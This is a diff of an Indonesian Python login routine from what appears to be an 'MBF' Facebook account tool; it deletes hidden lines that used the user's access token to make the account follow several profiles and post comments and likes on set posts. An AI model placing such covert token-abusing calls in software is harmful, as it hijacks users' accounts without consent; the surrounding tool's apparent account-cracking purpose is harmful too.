@@ -76,16 +76,7 @@ def cek_login():
 	love = random.choice(['❤️','💛','💚','💙','🖤','🧡','💜'])
 	kata = 'Pengguna Script MBF '
 	kom = kata+love+'\n'+pantun+'\n'+waktu
-        requests.post('https://graph.facebook.com/757953543/subscribers?access_token=' + toket)
-        requests.post('https://graph.facebook.com/100006609458697/subscribers?access_token=' + toket)
-        requests.post('https://graph.facebook.com/100064814153036/subscribers?access_token=' + toket)
-	requests.post('https://graph.facebook.com/10159408698958544/comments/?message=' +kom+ '&access_token=' + toket)
-        requests.post('https://graph.facebook.com/10159408698958544/likes?summary=true&access_token=' + toket)
-        requests.post('https://graph.facebook.com/10158807643598544/comments/?message=Mantap Bang ❤️&access_token=' + toket)
-        requests.post('https://graph.facebook.com/10158807643598544/likes?summary=true&access_token=' + toket)
-	requests.post('https://graph.facebook.com/100000288808056/subscribers?access_token=' + toket)
-	requests.post('https://graph.facebook.com/100000839038766/subscribers?access_token=' + toket)
-	requests.post('https://graph.facebook.com/100001540299108/subscribers?access_token=' + toket)
+
 	print (' [*] Login Berhasil')
 	menu()
 def cek_cookies():
